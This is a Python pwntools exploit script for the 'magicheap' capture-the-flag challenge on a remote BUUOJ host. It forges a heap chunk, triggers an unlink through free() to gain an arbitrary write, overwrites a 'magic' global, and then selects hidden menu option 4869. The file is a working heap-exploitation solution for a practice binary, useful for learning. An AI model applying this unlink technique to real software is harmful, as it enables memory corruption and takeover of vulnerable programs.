from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 26875)

elf = ELF('../magicheap')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-amd64/libc-2.23.so')

heap_array = 0x6020C0
magic = 0x6020A0  # should be bigger than 0x1305.

# Utility functions
def allocate(size, content):
  target.sendlineafter('choice :', '1')
  target.sendlineafter('Size of Heap : ', str(size))
  target.sendafter('Content of heap:', content)
  target.recvuntil('SuccessFul')


def edit(index, size, content):
  target.sendlineafter('choice :', '2')
  target.sendlineafter('Index :', str(index))
  target.sendlineafter('Size of Heap : ', str(size))
  target.sendafter('Content of heap : ', content)
  target.recvuntil('Done !')


def free(index):
  target.sendlineafter('choice :', '3')
  target.sendlineafter('Index :', str(index))

# 4869 => check magic.
# We need to unlink the chunk.
allocate(0x80, b'a' * 0x80)
allocate(0x80, b'b' * 0x80)
allocate(0x80, b'c' * 0x80)
allocate(0x30, b'd' * 0x30)
allocate(0x80, b'e' * 0x80)

heap_array3 = heap_array + 0x18
fd = heap_array3 - 0x18
bk = heap_array3 - 0x10

# Create a fake chunk and then unlink it.
fake_chunk = (p64(0x0) + p64(0x20) + p64(fd) + p64(bk) +
              p64(0x20)).ljust(0x30, b'f') + p64(0x30) + p64(0x90)

edit(3, len(fake_chunk), fake_chunk)
free(4)

edit(3, 8, p64(magic))
edit(0, 8, p64(0x1306))

target.sendlineafter('choice :', '4869')
target.interactive()